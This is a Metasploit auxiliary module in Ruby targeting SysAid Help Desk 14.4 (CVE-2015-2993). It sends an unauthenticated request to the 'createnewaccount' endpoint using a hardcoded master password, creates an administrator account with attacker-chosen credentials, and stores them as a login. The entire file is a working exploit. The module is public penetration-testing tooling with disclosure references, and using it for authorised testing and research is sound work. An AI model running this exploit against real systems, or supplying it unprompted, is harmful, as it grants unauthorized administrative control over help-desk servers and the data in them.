##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'SysAid Help Desk Administrator Account Creation',
      'Description' => %q{
        This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated
        user to create an administrator account. Note that this exploit will only work once. Any
        subsequent attempts will fail. On the other hand, the credentials must be verified
        manually. This module has been tested on SysAid 14.4 in Windows and Linux.
        },
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'CVE', '2015-2993' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2015/Jun/8' ],
          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt' ],
        ],
      'DisclosureDate' => 'Jun 3 2015'))

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 8080]),
        OptString.new('TARGETURI', [ true,  "SysAid path", '/sysaid']),
        OptString.new('USERNAME', [true, 'The username for the new admin account', 'msf']),
        OptString.new('PASSWORD', [true, 'The password for the new admin account', 'password'])
      ])
  end


  def run
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'createnewaccount'),
      'method' =>'GET',
      'vars_get' => {
        'accountID' => Rex::Text.rand_text_numeric(4),
        'organizationName' => Rex::Text.rand_text_alpha(rand(4) + rand(8)),
        'userName' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'masterPassword' => 'master123'
      }
    })
    if res && res.code == 200 && res.body.to_s =~ /Error while creating account/
      # No way to know whether this worked or not, it always says error
      print_status("The new administrator #{datastore['USERNAME']}:#{datastore['PASSWORD']} should be checked manually")

      connection_details = {
          module_fullname: self.fullname,
          username: datastore['USERNAME'],
          private_data: datastore['PASSWORD'],
          private_type: :password,
          access_level: 'Administrator',
          status: Metasploit::Model::Login::Status::UNTRIED
      }.merge(service_details)
      create_credential_and_login(connection_details)

    else
      print_error("Administrator account creation failed")
    end
  end
end
